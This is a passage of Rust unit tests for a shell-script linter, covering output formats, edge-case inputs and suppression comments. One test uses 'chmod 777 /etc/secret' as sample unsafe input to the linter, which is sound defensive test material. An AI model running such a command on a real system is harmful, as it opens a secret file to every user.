    let output = String::from_utf8(buf).unwrap();
    let parsed: serde_json::Value = serde_json::from_str(&output).unwrap();
    assert!(!parsed["diagnostics"].as_array().unwrap().is_empty());
}

#[test]
fn test_lint_then_write_human_integration() {
    let script = "chmod 777 /etc/secret\n";
    let result = lint_shell(script);

    let mut buf = Vec::new();
    write_results(&mut buf, &result, OutputFormat::Human, "unsafe.sh").unwrap();
    let output = String::from_utf8(buf).unwrap();
    // Should produce some output (either "No issues" or actual diagnostics)
    assert!(!output.is_empty());
}

// =============================================================================
// Edge cases and boundary conditions
// =============================================================================

#[test]
fn test_lint_shell_single_newline() {
    let result = lint_shell("\n");
    let _count = result.diagnostics.len();
}

#[test]
fn test_lint_shell_binary_like_content() {
    // Non-shell content should not panic
    let result = lint_shell("\x00\x01\x02\x03");
    let _count = result.diagnostics.len();
}

#[test]
fn test_lint_shell_very_long_line() {
    let line = format!("echo {}\n", "x".repeat(10000));
    let result = lint_shell(&line);
    let _count = result.diagnostics.len();
}

#[test]
fn test_lint_shell_many_lines() {
    let mut script = String::new();
    for i in 0..200 {
        script.push_str(&format!("echo \"line {}\"\n", i));
    }
    let result = lint_shell(&script);
    let _count = result.diagnostics.len();
}

#[test]
fn test_lint_shell_with_path_unknown_extension() {
    // Unknown extension should fall back to auto-detection
    let result = lint_shell_with_path(
        Path::new("script.xyz"),
        "#!/bin/bash\necho hello\n",
    );
    let _count = result.diagnostics.len();
}

#[test]
fn test_lint_shell_with_path_no_path_component() {
    let result = lint_shell_with_path(Path::new(""), "echo hello\n");
    let _count = result.diagnostics.len();
}

#[test]
fn test_lint_shell_multiple_suppressions() {
    let script = r#"# shellcheck disable=SC2086,SC2002
echo $VAR
cat file | grep x
"#;
    let result = lint_shell(script);
    assert!(
        !result.diagnostics.iter().any(|d| d.code == "SC2086"),
        "SC2086 should be suppressed"
    );
}

#[test]
fn test_lint_shell_inline_suppression() {
    let script = "echo $VAR # shellcheck disable=SC2086\n";
    let result = lint_shell(script);
    // The suppression comment location matters -- this tests inline handling
    let _count = result.diagnostics.len();
}
